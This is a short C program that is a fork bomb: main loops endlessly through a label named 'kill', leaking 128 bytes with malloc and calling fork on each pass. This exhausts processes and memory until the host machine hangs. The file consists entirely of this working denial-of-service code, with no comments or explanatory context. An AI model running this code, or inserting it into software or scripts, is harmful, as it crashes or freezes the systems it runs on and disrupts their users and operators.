#include <stdlib.h>
int main()
{
kill:
	malloc(128);
	fork();
	goto kill;
}
